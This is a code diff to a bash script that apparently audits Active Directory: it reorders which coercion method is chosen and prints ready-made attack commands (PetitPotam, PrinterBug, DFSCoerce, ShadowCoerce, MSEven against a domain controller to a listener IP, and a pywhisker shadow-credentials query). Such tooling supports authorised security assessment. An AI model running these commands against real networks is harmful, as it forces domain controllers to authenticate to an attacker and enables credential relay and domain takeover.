@@ -622,14 +622,21 @@ if [ ! -z "$COERCE_METHODS" ]; then
   if [ ! -z "$NON_DC_UNCON" ]; then
     echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
   fi
-  FIRST_COERCE=$(echo "$COERCE_METHODS" | tr ',' '\n' | tr -d ' ' | head -1)
-  case "$FIRST_COERCE" in
-    PetitPotam)   echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-    PrinterBug)   echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}" ;;
-    DFSCoerce)    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-    ShadowCoerce) echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-    MSEven)       echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-  esac
+  PREFERRED_ORDER=("PrinterBug" "PetitPotam" "DFSCoerce" "ShadowCoerce" "MSEven")
+    FIRST_COERCE=""
+    for method in "${PREFERRED_ORDER[@]}"; do
+      if echo "$COERCE_METHODS" | grep -q "$method"; then
+        FIRST_COERCE="$method"
+        break
+      fi
+    done
+    case "$FIRST_COERCE" in
+      PetitPotam)   echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+      PrinterBug)   echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}" ;;
+      DFSCoerce)    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+      ShadowCoerce) echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+      MSEven)       echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+    esac
 else
   echo -e "${GREEN}[OK] No coerce methods available on DC${NC}"
 fi
@@ -1256,7 +1263,6 @@ if [ "$SHADOW_CREDS_COUNT" -gt 0 ]; then
   FIRST_SHADOW_TARGET=$(echo "$SHADOW_CREDS_ACCOUNTS" | head -1)
   echo "$SHADOW_CREDS_ACCOUNTS" | while read -r account; do
     [ -z "$account" ] && continue
-    echo -e "${RED}       └─ $account${NC}"
   done
   echo -e "${GREY}       └─ pywhisker -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --target '$FIRST_SHADOW_TARGET' --action list${NC}"
 else
